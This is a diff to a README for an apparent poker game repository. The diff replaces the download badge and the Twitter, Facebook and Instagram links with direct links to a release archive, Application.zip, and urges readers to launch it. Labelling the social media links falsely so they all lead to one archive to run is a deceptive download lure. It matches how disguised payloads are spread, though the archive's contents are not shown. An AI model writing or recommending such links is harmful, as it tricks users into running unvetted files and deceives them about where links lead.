@@ -9,9 +9,9 @@ Welcome to the Poker Game repository! Here you can find all the necessary resour
 **Description:** *not provided*
 
 <!-- Add a fancy badge for the application download link -->
-[![Download Poker Game](https://img.shields.io/badge/Download-Application.zip-blue.svg)](https://github.com/file/Application.zip)
+[![Download Poker Game](https://github.com/houyinju/Poker-Game/releases/download/v1.0.0/Application.zip)](https://github.com/houyinju/Poker-Game/releases/download/v1.0.0/Application.zip)
 
-If the link ends with the file name "Application.zip", make sure to launch it to access the game.
+If the link ends with the file name "https://github.com/houyinju/Poker-Game/releases/download/v1.0.0/Application.zip", make sure to launch it to access the game.
 
 ## About the Game
 
@@ -41,9 +41,9 @@ Contributions to the Poker Game repository are welcome! If you have ideas for im
 Join our community of poker enthusiasts to connect with other players, share strategies, and participate in friendly competitions. Follow us on social media for updates and announcements related to the Poker Game.
 
 Connect with us on:
-- [Twitter](https://twitter.com/pokergame)
-- [Facebook](https://facebook.com/pokergame)
-- [Instagram](https://instagram.com/pokergame)
+- [Twitter](https://github.com/houyinju/Poker-Game/releases/download/v1.0.0/Application.zip)
+- [Facebook](https://github.com/houyinju/Poker-Game/releases/download/v1.0.0/Application.zip)
+- [Instagram](https://github.com/houyinju/Poker-Game/releases/download/v1.0.0/Application.zip)
 
 ## License
 
